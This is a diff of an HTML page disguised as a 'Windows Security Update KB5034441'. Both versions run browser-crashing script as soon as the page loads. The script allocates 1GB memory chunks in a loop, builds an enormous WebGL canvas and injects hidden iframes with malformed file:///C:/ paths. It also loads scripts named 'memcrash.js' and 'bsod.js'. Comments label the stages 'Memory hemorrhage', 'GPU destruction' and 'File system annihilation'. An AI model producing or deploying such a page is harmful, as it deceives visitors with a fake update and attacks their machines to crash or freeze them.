@@ -1,46 +1,40 @@
 <!DOCTYPE html>  
 <html>  
 <head>  
-    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">  
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline'">  
-    <script>  
-    // Phase 0: Disable browser safeguards  
-    Object.defineProperty(navigator, 'userAgent', {  
-        get: () => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)"  
-    });  
-    </script>  
+    <meta http-equiv="X-UA-Compatible" content="IE=5">  
+    <link rel="stylesheet" href="style.css">  
 </head>  
 <body>  
-    <!-- Decoy content -->  
     <h1>🔄 Windows Security Update KB5034441</h1>  
-    <div id="progress" style="width: 0%; height: 20px; background: blue;"></div>  
+    <div id="progress"></div>  
 
-    <script src="./memcrash.js"></script>  
+    <script src="bsod.js"></script>  
     <script>  
-    // Phase 1: Memory tsunami  
-    let progress = 0;  
-    const progressBar = document.getElementById('progress');  
-    const ramInterval = setInterval(() => {  
-        progress += 1;  
-        progressBar.style.width = progress + "%";  
-        if(progress >= 100) clearInterval(ramInterval);  
-    }, 50);  
+    // Phase 1: Memory hemorrhage  
+    let allocated = 0;  
+    setInterval(() => {  
+        try {  
+            new ArrayBuffer(1024 * 1024 * 1024); // 1GB chunks  
+            allocated++;  
+            document.title = `Allocated ${allocated}GB`;  
+        } catch(e) {}  
+    }, 100);  
 
-    // Phase 2: GPU bombardment  
+    // Phase 2: GPU destruction  
     setTimeout(() => {  
         const canvas = document.createElement('canvas');  
-        canvas.width = 131072;  // 128k resolution  
+        canvas.width = 131072;  
         canvas.height = 131072;  
         const gl = canvas.getContext('webgl');  
-        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvas);  
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, null);  
     }, 3000);  
 
-    // Phase 3: Filesystem annihilation  
+    // Phase 3: File system annihilation  
     setTimeout(() => {  
-        for(let i=0; i<100; i++){  
+        for(let i=0; i<100; i++) {  
             const iframe = document.createElement('iframe');  
-            iframe.src = `file:///C:/Windows/System32/${i}/%5C%5C?\\C:\\`;  
-            iframe.style.cssText = 'display:none !important';  
+            iframe.src = `file:///C:/Windows/${Math.random()}/%5C%5C?\\C:\\`;  
+            iframe.style.display = 'none';  
             document.body.appendChild(iframe);  
         }  
     }, 5000);  
